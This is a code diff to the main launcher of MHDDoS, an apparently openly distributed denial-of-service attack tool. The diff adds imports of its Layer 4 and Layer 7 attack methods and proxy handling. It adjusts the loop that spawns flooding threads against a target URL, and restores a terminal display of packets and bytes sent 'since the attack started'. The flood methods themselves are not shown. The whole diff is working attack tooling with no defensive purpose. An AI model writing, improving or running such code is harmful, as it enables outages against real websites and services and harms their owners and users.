@@ -1,4 +1,25 @@
+import logging
+import os
+from _socket import gethostbyname
+from contextlib import suppress
+from logging import basicConfig, getLogger, shutdown
+from os import _exit
 from pathlib import Path
+from sys import argv
+from threading import Event
+from PyRoxy import Tools as ProxyTools
+from blessed import Terminal
+
+from yarl import URL
+
+from MHDDoS.methods.layer_4 import Layer4
+from MHDDoS.methods.layer_7 import Layer7
+from MHDDoS.methods.methods import Methods
+from MHDDoS.methods.tools import Tools
+from MHDDoS.utils.misc import Counter
+from MHDDoS.utils.proxies import ProxyManager
+from MHDDoS.utils.text import craft_outreach_log_message
+from utils.blessed_utils import TextUtils
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -6,7 +27,7 @@ logger = getLogger("MHDDoS")
 logger.setLevel("INFO")
 logger.handlers.clear()
 
-__version__: str = "PALYANYTSYA"
+__version__: str = "MHDDOS"
 __dir__: Path = Path(__file__).parent
 logger = logging.getLogger()
 bombardier_path: str = ""
@@ -115,7 +136,7 @@ def start():
 
                 # TODO: manage threads actively
                 for _ in range(threads):
-                    Layer7(url, host, method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()
+                    Layer7(url, host, method, rpc, event, list(uagents), list(referers), list(proxies), BYTES_SENT, REQUESTS_SENT).start()
 
             if method in Methods.LAYER4_METHODS:
                 # HANDLE PARAMETERS
@@ -219,47 +240,58 @@ def start():
         Tools.usage()
 
 
-# def log_attack_status_new():
-#     global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
-#
-#     # craft status message
-#     message = "\n"
-#     message += craft_performance_log_message()
-#     message += craft_outreach_log_message(
-#         is_first_health_check_done,
-#         last_target_health_check_timestamp,
-#         last_l4_result,
-#         last_l4_proxied_results,
-#         last_l7_response,
-#         last_l7_proxied_responses
-#     )
-#
-#     # log the message
-#     if not status_logging_started:
-#         status_logging_started = True
-#     else:
-#         message_line_count = message.count("\n") + 1
-#         clear_lines_from_console(message_line_count)
-#         # pass
-#     print(message, end="")
+term = Terminal()
+is_first_health_check_done = False
+last_target_health_check_timestamp = -1
+last_l4_result = None
+last_l4_proxied_results = None
+last_l7_response = None
+last_l7_proxied_responses = None
 
 
-# def craft_performance_log_message():
-#     # craft the status log message
-#     pps = Tools.humanformat(int(REQUESTS_SENT))
-#     bps = Tools.humanbytes(int(BYTES_SENT))
-#     tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
-#     tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
-#     status_string = f"Status:\n" \
-#                     f"    Outgoing data:\n" \
-#                     f"       Per second:\n" \
-#                     f"          Packets/s: {pps}\n" \
-#                     f"          Bytes/s:   {bps}\n" \
-#                     f"       Total since the attack started:\n" \
-#                     f"          Packets sent: {tp}\n" \
-#                     f"          Bytes sent:   {tb}\n"
-#
-#     return status_string
+def log_attack_status_new():
+    global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
+
+    # craft status message
+    message = "\n"
+    message += craft_performance_log_message()
+    # message += craft_outreach_log_message(
+    #     is_first_health_check_done,
+    #     last_target_health_check_timestamp,
+    #     last_l4_result,
+    #     last_l4_proxied_results,
+    #     last_l7_response,
+    #     last_l7_proxied_responses
+    # )
+
+    # log the message
+    message = TextUtils.pad_to_itself(message)
+    message = TextUtils.truncate_to_box(message, term.width, term.height)
+    height = TextUtils.height(message)
+
+    if not status_logging_started:
+        status_logging_started = True
+
+    with term.location(0, term.height - height - 1):
+        print(message, end="", flush=True)
+
+
+def craft_performance_log_message():
+    # craft the status log message
+    pps = Tools.humanformat(int(REQUESTS_SENT))
+    bps = Tools.humanbytes(int(BYTES_SENT))
+    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
+    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
+    status_string = f"Status:\n" \
+                    f"    Outgoing data:\n" \
+                    f"       Per second:\n" \
+                    f"          Packets/s: {pps}\n" \
+                    f"          Bytes/s:   {bps}\n" \
+                    f"       Total since the attack started:\n" \
+                    f"          Packets sent: {tp}\n" \
+                    f"          Bytes sent:   {tb}\n"
+
+    return status_string
 
 
 if __name__ == '__main__':
